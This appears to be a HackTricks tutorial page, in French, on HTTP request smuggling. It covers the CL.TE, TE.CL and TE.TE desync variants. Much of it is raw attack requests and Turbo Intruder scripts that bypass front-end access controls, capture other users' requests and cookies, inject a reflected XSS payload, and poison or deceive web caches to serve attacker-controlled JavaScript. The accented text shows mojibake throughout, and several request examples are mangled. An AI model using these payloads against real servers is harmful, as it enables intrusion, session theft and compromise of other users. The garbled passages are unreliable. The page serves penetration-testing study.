# HTTP Request Smuggling / Attaque de dÃ©synchronisation HTTP

<details>

<summary><strong>Apprenez le piratage AWS de zÃ©ro Ã  hÃ©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncÃ©e dans HackTricks** ou **tÃ©lÃ©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* DÃ©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** ğŸ’¬ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-moi** sur **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux dÃ©pÃ´ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Qu'est-ce que c'est

Cette vulnÃ©rabilitÃ© se produit lorsqu'une **dÃ©synchronisation** entre les **proxies frontaux** et le serveur **back-end** permet Ã  un **attaquant** d'**envoyer** une requÃªte HTTP qui sera **interprÃ©tÃ©e** comme une **requÃªte unique** par les proxies frontaux (Ã©quilibreur de charge/proxy inverse) et **comme 2 requÃªtes** par le serveur **back-end**.\
Cela permet Ã  un utilisateur de **modifier la prochaine requÃªte qui arrive au serveur back-end aprÃ¨s la sienne**.

### ThÃ©orie

[**SpÃ©cification RFC (2161)**](https://tools.ietf.org/html/rfc2616)

> Si un message est reÃ§u avec Ã  la fois un champ d'en-tÃªte Transfer-Encoding et un champ d'en-tÃªte Content-Length, ce dernier DOIT Ãªtre ignorÃ©.

**Content-Length**

> L'en-tÃªte d'entitÃ© Content-Length indique la taille du corps de l'entitÃ©, en octets, envoyÃ©e au destinataire.

**Transfer-Encoding: chunked**

> L'en-tÃªte Transfer-Encoding spÃ©cifie la forme de codage utilisÃ©e pour transfÃ©rer en toute sÃ©curitÃ© le corps de la charge utile Ã  l'utilisateur.\
> Chunked signifie que des donnÃ©es volumineuses sont envoyÃ©es en une sÃ©rie de morceaux

### RÃ©alitÃ©

Le **Front-End** (un Ã©quilibreur de charge / Proxy inverse) **traite** l'en-tÃªte _**content-length**_ ou l'en-tÃªte _**transfer-encoding**_ et le serveur **Back-end** **traite l'autre**, provoquant une **dÃ©synchronisation** entre les 2 systÃ¨mes.\
Cela pourrait Ãªtre trÃ¨s critique car **un attaquant pourra envoyer une requÃªte** au proxy inverse qui sera **interprÃ©tÃ©e** par le serveur **back-end** **comme 2 requÃªtes diffÃ©rentes**. Le **danger** de cette technique rÃ©side dans le fait que le serveur **back-end** **interprÃ©tera** la **2Ã¨me requÃªte injectÃ©e** comme si elle **provenait du client suivant** et la **vraie requÃªte** de ce client fera **partie** de la **requÃªte injectÃ©e**.

### ParticularitÃ©s

Rappelez-vous qu'en HTTP **un caractÃ¨re de nouvelle ligne est composÃ© de 2 octets :**

* **Content-Length** : Cet en-tÃªte utilise un **nombre dÃ©cimal** pour indiquer le **nombre** d'**octets** du **corps** de la requÃªte. Le corps est censÃ© se terminer au dernier caractÃ¨re, **une nouvelle ligne n'est pas nÃ©cessaire Ã  la fin de la requÃªte**.
* **Transfer-Encoding :** Cet en-tÃªte utilise dans le **corps** un **nombre hexadÃ©cimal** pour indiquer le **nombre** d'**octets** du **prochain morceau**. Le **morceau** doit **se terminer** par une **nouvelle ligne** mais cette nouvelle ligne **n'est pas comptÃ©e** par l'indicateur de longueur. Cette mÃ©thode de transfert doit se terminer par un **morceau de taille 0 suivi de 2 nouvelles lignes** : `0`
* **Connection** : D'aprÃ¨s mon expÃ©rience, il est recommandÃ© d'utiliser **`Connection: keep-alive`** sur la premiÃ¨re requÃªte du Smuggling de requÃªte.

## Exemples de base

Ainsi, les attaques de Smuggling de requÃªte impliquent de placer Ã  la fois l'en-tÃªte `Content-Length` et l'en-tÃªte `Transfer-Encoding` dans une seule requÃªte HTTP et de les manipuler de maniÃ¨re Ã  ce que les serveurs frontal et back-end traitent la requÃªte diffÃ©remment. La maniÃ¨re exacte de procÃ©der dÃ©pend du comportement des deux serveurs :

* **CL.TE** : le serveur frontal utilise l'en-tÃªte `Content-Length` et le serveur back-end utilise l'en-tÃªte `Transfer-Encoding`.
* **TE.CL** : le serveur frontal utilise l'en-tÃªte `Transfer-Encoding` et le serveur back-end utilise l'en-tÃªte `Content-Length`.
* **TE.TE** : les serveurs frontal et back-end prennent tous deux en charge l'en-tÃªte `Transfer-Encoding`, mais l'un des serveurs peut Ãªtre induit Ã  ne pas le traiter en obscurcissant l'en-tÃªte d'une certaine maniÃ¨re.

### VulnÃ©rabilitÃ©s CL.TE

Ici, le serveur **frontal** utilise l'en-tÃªte **`Content-Length`** et le serveur **back-end** utilise l'en-tÃªte **`Transfer-Encoding`**. Nous pouvons effectuer une attaque simple de Smuggling de requÃªte HTTP comme suit :

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Content-Length: 30`\
`Connection: keep-alive`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /404 HTTP/1.1`\
`Foo: x`

Notez comment `Content-Length` indique que la **longueur du corps de la requÃªte est de 30 octets** (_rappelez-vous que HTTP utilise comme nouvelle ligne, donc 2 octets pour chaque nouvelle ligne_), donc le proxy inverse **envoiera la requÃªte complÃ¨te** au back-end, et le back-end traitera l'en-tÃªte `Transfer-Encoding` en laissant `GET /404 HTTP/1.1` comme le **dÃ©but de la prochaine requÃªte** (au fait, la prochaine requÃªte sera ajoutÃ©e Ã  `Foo:x<Le dÃ©but de la prochaine requÃªte ici>`).

### VulnÃ©rabilitÃ©s TE.CL

Ici, le serveur frontal utilise l'en-tÃªte `Transfer-Encoding` et le serveur back-end utilise l'en-tÃªte `Content-Length`. Nous pouvons effectuer une attaque simple de Smuggling de requÃªte HTTP comme suit :

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Content-Length: 4`\
`Connection: keep-alive`\
`Transfer-Encoding: chunked`\
``\ `7b`\ `GET /404 HTTP/1.1`\ `Host: vulnerable-website.com`\ `Content-Type: application/x-www-form-urlencoded`\ `Content-Length: 30`\``\
`x=`\
`0`\
`\`

Dans ce cas, le **reverse-proxy** **envoiera la requÃªte entiÃ¨re** au **back-end** comme l'indique l'**`Transfer-encoding`**. Mais, le **back-end** va **traiter** seulement les **`7b`** (4 octets) comme indiquÃ© dans le `Content-Length`. Par consÃ©quent, la prochaine requÃªte sera celle commenÃ§ant par `GET /404 HTTP/1.1`

_Notez que mÃªme si l'attaque doit se terminer par un `0`, la requÃªte suivante sera ajoutÃ©e comme valeurs supplÃ©mentaires du paramÃ¨tre **x**._\
_Notez Ã©galement que le Content-Length de la requÃªte intÃ©grÃ©e indiquera la longueur de la prochaine requÃªte qui sera ajoutÃ©e au paramÃ¨tre **x**. Si elle est trop petite, seuls quelques octets seront ajoutÃ©s, et si elle est trop grande (plus grande que la longueur de la prochaine requÃªte) une erreur sera gÃ©nÃ©rÃ©e pour la prochaine requÃªte._

### VulnÃ©rabilitÃ©s TE.TE

Ici, les serveurs frontal et back-end prennent tous deux en charge l'en-tÃªte `Transfer-Encoding`, mais l'un des serveurs peut Ãªtre induit Ã  ne pas le traiter en obscurcissant l'en-tÃªte d'une certaine maniÃ¨re.\
Il existe potentiellement une infinitÃ© de faÃ§ons d'obscurcir l'en-tÃªte `Transfer-Encoding`. Par exemple :

`Transfer-Encoding: xchunked`\
``\ `Transfer-Encoding : chunked`\``\
`Transfer-Encoding: chunked`\
`Transfer-Encoding: x`\
``\ `Transfer-Encoding: chunked`\ `Transfer-encoding: x`\``\
`Transfer-Encoding:[tab]chunked`\
``\ `[space]Transfer-Encoding: chunked`\``\
`X: X[\n]Transfer-Encoding: chunked`\
\`\`\
`Transfer-Encoding`\
`: chunked`

Selon le serveur (reverse-proxy ou back-end) qui **arrÃªte de traiter** l'en-tÃªte **TE**, vous trouverez une vulnÃ©rabilitÃ© **CL.TE** ou **TE.CL**.

## Trouver le Smuggling de requÃªte HTTP

### Trouver des vulnÃ©rabilitÃ©s CL.TE en utilisant des techniques de temporisation

Si une application est vulnÃ©rable Ã  la variante CL.TE du Smuggling de requÃªte, alors l'envoi d'une requÃªte comme la suivante provoquera souvent un dÃ©lai :
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0
```
Ã‰tant donnÃ© que le serveur frontal utilise l'en-tÃªte `Content-Length`, il ne transmettra qu'une partie de cette requÃªte, omettant le `0`. Le serveur back-end utilise l'en-tÃªte `Transfer-Encoding`, traite le premier bloc, puis attend l'arrivÃ©e du bloc suivant. Cela provoquera un dÃ©lai d'attente observable.

Parfois, au lieu d'obtenir un dÃ©lai d'expiration, vous recevez une mauvaise requÃªte 400 de l'hÃ´te final comme dans le scÃ©nario suivant, oÃ¹ une charge utile CL.TE est envoyÃ©e :

![](<../../.gitbook/assets/image (444).png>)

Et la rÃ©ponse est une redirection contenant une erreur dans le corps avec mÃªme la version du haproxy utilisÃ© :

![](<../../.gitbook/assets/image (443).png>)

### Trouver des vulnÃ©rabilitÃ©s TE.CL en utilisant des techniques de temporisation

Si une application est vulnÃ©rable Ã  la variante TE.CL de l'encapsulation de requÃªtes, alors l'envoi d'une requÃªte comme la suivante provoquera souvent un dÃ©lai d'attente :
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X
```
### Sonder les vulnÃ©rabilitÃ©s de contrebande de requÃªtes HTTP

Une fois que vous avez constatÃ© que **les techniques de chronomÃ©trage fonctionnent**, vous devez **sonder** si vous pouvez **modifier les requÃªtes d'autres clients**.\
La maniÃ¨re la plus simple de faire cela est d'essayer d'empoisonner vos propres requÃªtes, **faire en sorte qu'une requÃªte pour `/` renvoie un 404 par exemple**.\
Dans les [Exemples de base](./#basic-examples), nous avons dÃ©jÃ  vu des exemples de `CL.TE` et `TE.CL` sur la maniÃ¨re d'empoisonner une requÃªte client pour demander `/404` provoquant une rÃ©ponse 404 lorsque le client demandait une autre ressource.

**Notes**

Certaines considÃ©rations importantes doivent Ãªtre prises en compte lors de la tentative de confirmation des vulnÃ©rabilitÃ©s de contrebande de requÃªtes via l'interfÃ©rence avec d'autres requÃªtes :

* La requÃªte "d'attaque" et la requÃªte "normale" doivent Ãªtre envoyÃ©es au serveur en utilisant des connexions rÃ©seau diffÃ©rentes. Envoyer les deux requÃªtes Ã  travers la mÃªme connexion ne prouvera pas que la vulnÃ©rabilitÃ© existe.
* La requÃªte "d'attaque" et la requÃªte "normale" doivent utiliser la mÃªme URL et les mÃªmes noms de paramÃ¨tres, autant que possible. Cela est dÃ» au fait que de nombreuses applications modernes acheminent les requÃªtes du front-end vers diffÃ©rents serveurs back-end en fonction de l'URL et des paramÃ¨tres. Utiliser la mÃªme URL et les mÃªmes paramÃ¨tres augmente la chance que les requÃªtes soient traitÃ©es par le mÃªme serveur back-end, ce qui est essentiel pour que l'attaque fonctionne.
* Lors du test de la requÃªte "normale" pour dÃ©tecter toute interfÃ©rence de la requÃªte "d'attaque", vous Ãªtes en compÃ©tition avec toutes les autres requÃªtes que l'application reÃ§oit en mÃªme temps, y compris celles d'autres utilisateurs. Vous devriez envoyer la requÃªte "normale" immÃ©diatement aprÃ¨s la requÃªte "d'attaque". Si l'application est occupÃ©e, vous pourriez avoir besoin de rÃ©aliser plusieurs tentatives pour confirmer la vulnÃ©rabilitÃ©.
* Dans certaines applications, le serveur front-end fonctionne comme un Ã©quilibreur de charge et achemine les requÃªtes vers diffÃ©rents systÃ¨mes back-end selon un algorithme d'Ã©quilibrage de charge. Si vos requÃªtes "d'attaque" et "normale" sont acheminÃ©es vers diffÃ©rents systÃ¨mes back-end, alors l'attaque Ã©chouera. C'est une raison supplÃ©mentaire pour laquelle vous pourriez avoir besoin d'essayer plusieurs fois avant qu'une vulnÃ©rabilitÃ© puisse Ãªtre confirmÃ©e.
* Si votre attaque rÃ©ussit Ã  interfÃ©rer avec une requÃªte subsÃ©quente, mais que ce n'Ã©tait pas la requÃªte "normale" que vous avez envoyÃ©e pour dÃ©tecter l'interfÃ©rence, cela signifie qu'un autre utilisateur de l'application a Ã©tÃ© affectÃ© par votre attaque. Si vous continuez Ã  effectuer le test, cela pourrait avoir un effet perturbateur sur les autres utilisateurs, et vous devriez faire preuve de prudence.

### Forcer via les en-tÃªtes hop-by-hop

En abusant des en-tÃªtes hop-by-hop, vous pourriez indiquer au proxy de **supprimer l'en-tÃªte Content-Length ou Transfer-Encoding afin qu'une contrebande de requÃªte HTTP soit possible Ã  exploiter**.
```
Connection: Content-Length
```
Pour **plus d'informations sur les en-tÃªtes de saut par saut**, visitez :

{% content-ref url="../abusing-hop-by-hop-headers.md" %}
[abusing-hop-by-hop-headers.md](../abusing-hop-by-hop-headers.md)
{% endcontent-ref %}

## Abuser de l'HTTP Request Smuggling

### Pour contourner les contrÃ´les de sÃ©curitÃ© frontaux

Parfois, **les proxies frontaux effectuent certains contrÃ´les de sÃ©curitÃ©**. Vous pouvez les Ã©viter en abusant de l'HTTP Request Smuggling car vous serez capable de **contourner les protections**. Par exemple, dans cet exemple, vous **ne pouvez pas accÃ©der Ã  `/admin` de l'extÃ©rieur** et le proxy frontal vÃ©rifie cela, mais ce **proxy ne vÃ©rifie pas la requÃªte intÃ©grÃ©e** :

**CL.TE**

`POST / HTTP/1.1`\
`Host: acb21fdd1f98c4f180c02944000100b5.web-security-academy.net`\
`Cookie: session=xht3rUYoc83NfuZkuAp8sDxzf0AZIwQr`\
`Connection: keep-alive`\
`Content-Type: application/x-www-form-urlencoded`\
`Content-Length: 67`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /admin HTTP/1.1`\
`Host: localhost`\
`Content-Length: 10`\
\`\`\
`x=`

**TE.CL**

`POST / HTTP/1.1`\
`Host: ace71f491f52696180f41ed100d000d4.web-security-academy.net`\
`Cookie: session=Dpll5XYw4hNEu09dGccoTjHlFNx5QY1c`\
`Content-Type: application/x-www-form-urlencoded`\
`Connection: keep-alive`\
`Content-Length: 4`\
`Transfer-Encoding: chunked`\
`2b`\
`GET /admin HTTP/1.1`\
`Host: localhost`\
`a=x`\
`0`\
`\`

### RÃ©vÃ©ler la rÃ©Ã©criture des requÃªtes frontales <a href="#revealing-front-end-request-rewriting" id="revealing-front-end-request-rewriting"></a>

Dans de nombreuses applications, **le serveur frontal effectue une rÃ©Ã©criture des requÃªtes** avant de les transmettre au serveur backend, gÃ©nÃ©ralement en ajoutant des en-tÃªtes de requÃªte supplÃ©mentaires.\
Une chose courante Ã  faire est d'**ajouter Ã  la requÃªte l'en-tÃªte** `X-Forwarded-For: <IP du client>` ou un en-tÃªte similaire pour que le backend connaisse l'IP du client.\
Parfois, si vous pouvez **trouver quelles nouvelles valeurs sont ajoutÃ©es** Ã  la requÃªte, vous pourriez Ãªtre capable de **contourner les protections** et **accÃ©der Ã  des informations/endpoints cachÃ©s**.

Pour dÃ©couvrir comment le proxy rÃ©Ã©crit la requÃªte, vous devez **trouver un paramÃ¨tre POST que le backend reflÃ©tera dans sa valeur** sur la rÃ©ponse. Ensuite, utilisez ce paramÃ¨tre en dernier et utilisez une exploitation comme celle-ci :

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Content-Length: 130`\
`Connection: keep-alive`\
`Transfer-Encoding: chunked`\
`0`\
``\ `POST /search HTTP/1.1`\ `Host: vulnerable-website.com`\ `Content-Type: application/x-www-form-urlencoded`\ `Content-Length: 100`\``\
`search=`

Dans ce cas, la requÃªte suivante sera ajoutÃ©e aprÃ¨s `search=`, qui est aussi **le paramÃ¨tre dont la valeur sera reflÃ©tÃ©e** sur la rÃ©ponse, donc elle va **reflÃ©ter les en-tÃªtes de la requÃªte suivante**.

Notez que **seule la longueur indiquÃ©e dans l'en-tÃªte `Content-Length` de la requÃªte intÃ©grÃ©e sera reflÃ©tÃ©e**. Si vous utilisez un petit nombre, seuls quelques octets seront reflÃ©tÃ©s, si vous utilisez un nombre plus grand que la longueur de tous les en-tÃªtes, alors la requÃªte intÃ©grÃ©e gÃ©nÃ©rera une erreur. Ensuite, vous devriez **commencer** avec un **petit nombre** et **augmenter** jusqu'Ã  ce que vous voyiez tout ce que vous vouliez voir.\
Notez Ã©galement que cette **technique est Ã©galement exploitable avec une vulnÃ©rabilitÃ© TE.CL** mais la requÃªte doit se terminer par `search=\r\n0`. Cependant, indÃ©pendamment des caractÃ¨res de nouvelle ligne, les valeurs seront ajoutÃ©es au paramÃ¨tre de recherche.

Enfin, notez que dans cette attaque, nous attaquons toujours nous-mÃªmes pour apprendre comment le proxy frontal rÃ©Ã©crit la requÃªte.

### Capturer les requÃªtes d'autres utilisateurs <a href="#capturing-other-users-requests" id="capturing-other-users-requests"></a>

Si vous trouvez une requÃªte POST qui va enregistrer le contenu de l'un des paramÃ¨tres, vous pouvez ajouter la requÃªte suivante comme valeur de ce paramÃ¨tre afin de stocker la requÃªte du prochain client :

`POST / HTTP/1.1`\
`Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net`\
`Content-Type: application/x-www-form-urlencoded`\
`Content-Length: 319`\
`Connection: keep-alive`\
`Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`POST /post/comment HTTP/1.1`\
`Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net`\
`Content-Length: 659`\
`Content-Type: application/x-www-form-urlencoded`\
`Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi`\
\`\`\
`csrf=gpGAVAbj7pKq7VfFh45CAICeFCnancCM&postId=4&name=HACKTRICKS&email=email%40email.com&comment=`

Dans ce cas, la valeur du **paramÃ¨tre commentaire** sera **enregistrÃ©e dans un commentaire** d'un post sur la page qui est **publiquement accessible**, donc un **commentaire apparaÃ®tra avec le contenu de la requÃªte suivante**.

_Une limitation avec cette technique est qu'elle ne capturera gÃ©nÃ©ralement que les donnÃ©es jusqu'au dÃ©limiteur de paramÃ¨tre applicable pour la requÃªte introduite. Pour les soumissions de formulaires encodÃ©s en URL, ce sera le caractÃ¨re `&`, ce qui signifie que le contenu stockÃ© de la requÃªte de l'utilisateur victime se terminera au premier `&`, qui pourrait mÃªme apparaÃ®tre dans la chaÃ®ne de requÃªte._

Notez Ã©galement que cette **technique est Ã©galement exploitable avec une vulnÃ©rabilitÃ© TE.CL** mais la requÃªte doit se terminer par `search=\r\n0`. Cependant, indÃ©pendamment des caractÃ¨res de nouvelle ligne, les valeurs seront ajoutÃ©es au paramÃ¨tre de recherche.

### Utiliser l'HTTP Request Smuggling pour exploiter le XSS rÃ©flÃ©chi

Si la page Web est Ã©galement **vulnÃ©rable au XSS rÃ©flÃ©chi**, vous pouvez abuser de l'HTTP Request Smuggling pour attaquer les clients du Web. L'exploitation du XSS rÃ©flÃ©chi Ã  partir de l'HTTP Request Smuggling prÃ©sente certains avantages :

* **Aucune interaction avec les utilisateurs victimes n'est requise**
* Il peut Ãªtre utilisÃ© pour **exploiter** un comportement XSS dans des parties de la requÃªte qui **ne peuvent pas Ãªtre contrÃ´lÃ©es trivialement dans une attaque XSS rÃ©flÃ©chie normale**, telles que les en-tÃªtes de requÃªte HTTP.

Si un site Web est vulnÃ©rable au XSS rÃ©flÃ©chi sur l'en-tÃªte User-Agent, vous pouvez utiliser ce payload pour l'exploiter :

`POST / HTTP/1.1`\
`Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net`\
`User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0`\
`Cookie: session=Ro7YknOtbl3bxURHAAxZz84qj3PSMnSY`\
`Transfer-Encoding: chunked`\
`Connection: keep-alive`\
`Content-Length: 213`\
`Content-Type: application/x-www-form-urlencoded`\
``\ `0`\``\
`GET /post?postId=2 HTTP/1.1`\
`Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net`\
`User-Agent: "><script>alert(1)</script>`\
`Content-Length: 10`\
`Content-Type: application/x-www-form-urlencoded`\
\`\`\
`A=`

### Utiliser l'HTTP Request Smuggling pour transformer une redirection sur site en une redirection ouverte <a href="#using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect" id="using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect"></a>

De nombreuses applications effectuent des redirections sur site d'une URL Ã  une autre et placent le nom d'hÃ´te de l'en-tÃªte `Host` de la requÃªte dans l'URL de redirection. Un exemple de ce comportement est le comportement par dÃ©faut des serveurs Web Apache et IIS, oÃ¹ une demande pour un dossier sans barre oblique finale reÃ§oit une redirection vers le mÃªme dossier incluant la barre oblique finale :

`GET /home HTTP/1.1`\
`Host: normal-website.com`\
\`\`\
`HTTP/1.1 301 Moved Permanently`\
`Location: https://normal-website.com/home/`

Ce comportement est normalement considÃ©rÃ© comme inoffensif, mais il peut Ãªtre exploitÃ© dans une attaque de smuggling de requÃªte pour rediriger d'autres utilisateurs vers un domaine externe. Par exemple :

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Content-Length: 54`\
`Connection: keep-alive`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /home HTTP/1.1`\
`Host: attacker-website.com`\
`Foo: X`

La requÃªte introduite dÃ©clenchera une redirection vers le site Web de l'attaquant, ce qui affectera la requÃªte du prochain utilisateur traitÃ©e par le serveur backend. Par exemple :

`GET /home HTTP/1.1`\
`Host: attacker-website.com`\
`Foo: XGET /scripts/include.js HTTP/1.1`\
`Host: vulnerable-website.com`\
\`\`\
`HTTP/1.1 301 Moved Permanently`\
`Location: https://attacker-website.com/home/`

Ici, la requÃªte de l'utilisateur Ã©tait pour un fichier JavaScript qui Ã©tait importÃ© par une page sur le site Web. L'attaquant peut compromettre complÃ¨tement l'utilisateur victime en retournant leur propre JavaScript dans la rÃ©ponse.

### Utiliser l'HTTP Request Smuggling pour effectuer un empoisonnement de cache Web <a href="#using-http-request-smuggling-to-perform-web-cache-poisoning" id="using-http-request-smuggling-to-perform-web-cache-poisoning"></a>

Si une partie de **l'infrastructure frontale effectue la mise en cache du contenu** (gÃ©nÃ©ralement pour des raisons de performance), il **pourrait Ãªtre possible d'empoisonner ce cache en modifiant la rÃ©ponse du serveur**.

Nous avons dÃ©jÃ  vu comment modifier la valeur de retour attendue du serveur en une erreur 404 (dans les [Exemples de base](./#basic-examples)), de maniÃ¨re similaire, vous pourriez faire en sorte que le serveur retourne le contenu de /index.html lorsque la requÃªte empoisonnÃ©e demande `/static/include.js`. De cette faÃ§on, le contenu de `/static/include.js` sera mis en cache avec le contenu de `/index.html`, rendant `/static/include.js` inaccessible aux clients (DoS ?).

Remarquez que c'est encore plus intÃ©ressant si vous trouvez une **Redirection Ouverte** ou une **redirection sur site vers une redirection ouverte** (derniÃ¨re section). Parce que, vous pourriez Ãªtre capable de **changer les valeurs du cache** de `/static/include.js` avec **celles d'un script contrÃ´lÃ© par vous** (faisant un **XSS gÃ©nÃ©ral Ã  tous les clients** qui essaient de tÃ©lÃ©charger la nouvelle version de `/static/include.js`).

Dans cet exemple, il va Ãªtre montrÃ© comment vous pouvez exploiter un **empoisonnement de cache + redirection sur site vers une redirection ouverte** pour modifier le contenu du cache de `/static/include.js` pour **servir du code JS contrÃ´lÃ©** par l'attaquant :

`POST / HTTP/1.1`\
`Host: vulnerable.net`\
`Content-Type: application/x-www-form-urlencoded`\
`Connection: keep-alive`\
`Content-Length: 124`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /post/next?postId=3 HTTP/1.1`\
`Host: attacker.net`\
`Content-Type: application/x-www-form-urlencoded`\
`Content-Length: 10`\
\`\`\
`x=1`

Notez comment la requÃªte intÃ©grÃ©e demande `/post/next?postId=3` Cette requÃªte va Ãªtre redirigÃ©e vers `/post?postId=4` et **utilisera la valeur de l'en-tÃªte Host** pour indiquer le domaine. Par consÃ©quent, vous pouvez **modifier l'en-tÃªte Host** pour pointer le serveur de l'attaquant et la redirection utilisera ce domaine (**redirection sur site vers une redirection ouverte**).

Ensuite, **aprÃ¨s avoir empoisonnÃ© le socket**, vous devez envoyer une **requÃªte GET** Ã  **`/static/include.js`** cette requÃªte sera **empoisonnÃ©e** par la requÃªte de **redirection sur site vers une redirection ouverte** et **saisira le contenu du script contrÃ´lÃ© par l'attaquant**.

La prochaine fois que quelqu'un demandera `/static/include.js`, le contenu mis en cache du script de l'attaquant sera servi (XSS gÃ©nÃ©ral).

### Utiliser l'HTTP Request Smuggling pour effectuer une dÃ©ception de cache Web <a href="#using-http-request-smuggling-to-perform-web-cache-deception" id="using-http-request-smuggling-to-perform-web-cache-deception"></a>

> **Quelle est la diffÃ©rence entre l'empoisonnement de cache Web et la dÃ©ception de cache Web ?**
>
> * Dans **l'empoisonnement de cache Web**, l'attaquant amÃ¨ne l'application Ã  stocker un contenu malveillant dans le cache, et ce contenu est servi Ã  partir du cache Ã  d'autres utilisateurs de l'application.
> * Dans **la dÃ©ception de cache Web**, l'attaquant amÃ¨ne l'application Ã  stocker un contenu sensible appartenant Ã  un autre utilisateur dans le cache, et l'attaquant rÃ©cupÃ¨re ensuite ce contenu Ã  partir du cache.

Dans cette variante, l'attaquant introduit une requÃªte qui retourne un contenu sensible spÃ©cifique Ã  l'utilisateur. Par exemple :

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Connection: keep-alive`\
`Content-Length: 43`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /private/messages HTTP/1.1`\
`Foo: X`

Si **l'empoisonnement atteint un client qui accÃ©dait Ã  un contenu statique** comme `/someimage.png` qui allait Ãªtre **mis en cache**. Le contenu de `/private/messages` de la victime sera mis en cache dans `/someimage.png` et l'attaquant pourra les voler.\
Notez que **l'attaquant ne sait pas quel contenu statique la victime essayait d'accÃ©der** donc probablement la meilleure faÃ§on de tester cela est de rÃ©aliser l'attaque, attendre quelques secondes et **charger tout** le contenu statique et **rechercher les donnÃ©es privÃ©es**.

### Armer l'HTTP Request Smuggling avec la dÃ©synchronisation de la rÃ©ponse HTTP

Avez-vous trouvÃ© une vulnÃ©rabilitÃ© d'HTTP Request Smuggling et vous ne savez pas comment l'exploiter. Essayez ces autres mÃ©thodes d'exploitation :

{% content-ref url="../http-response-smuggling-desync.md" %}
[http-response-smuggling-desync.md](../http-response-smuggling-desync.md)
{% endcontent-ref %}

## Scripts Turbo intruder

### CL.TE

Depuis [https://hipotermia.pw/bb/http-desync-idor](https://hipotermia.pw/bb/http-desync-idor)
```python
def queueRequests(target, wordlists):

engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Transfer-Encoding: chunked
Host: xxx.com
Content-Length: 35
Foo: bar

0

GET /admin7 HTTP/1.1
X-Foo: k'''

engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)

def handleResponse(req, interesting):
table.add(req)
```
### TE.CL

De : [https://hipotermia.pw/bb/http-desync-account-takeover](https://hipotermia.pw/bb/http-desync-account-takeover)
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Host: xxx.com
Content-Length: 4
Transfer-Encoding : chunked

46
POST /nothing HTTP/1.1
Host: xxx.com
Content-Length: 15

kk
0

'''
engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)


def handleResponse(req, interesting):
table.add(req)
```
## Plus d'informations

![](../../.gitbook/assets/EKi5edAUUAAIPIK.jpg)

[Image d'ici.](https://twitter.com/SpiderSec/status/1200413390339887104?ref\_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1200413390339887104\&ref\_url=https%3A%2F%2Ftwitter.com%2FSpiderSec%2Fstatus%2F1200413390339887104)

## Outils

* [https://github.com/anshumanpattnaik/http-request-smuggling](https://github.com/anshumanpattnaik/http-request-smuggling)
* [https://github.com/PortSwigger/http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler)
* [https://github.com/gwen001/pentest-tools/blob/master/smuggler.py](https://github.com/gwen001/pentest-tools/blob/master/smuggler.py)
* [https://github.com/defparam/smuggler](https://github.com/defparam/smuggler)
* [https://github.com/bahruzjabiyev/t-reqs-http-fuzzer](https://github.com/bahruzjabiyev/t-reqs-http-fuzzer) : Cet outil est un Fuzzer HTTP basÃ© sur la grammaire utile pour trouver des disparitÃ©s Ã©tranges de request smuggling.

## RÃ©fÃ©rences

* [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
* [https://portswigger.net/web-security/request-smuggling/finding](https://portswigger.net/web-security/request-smuggling/finding)
* [https://portswigger.net/web-security/request-smuggling/exploiting](https://portswigger.net/web-security/request-smuggling/exploiting)
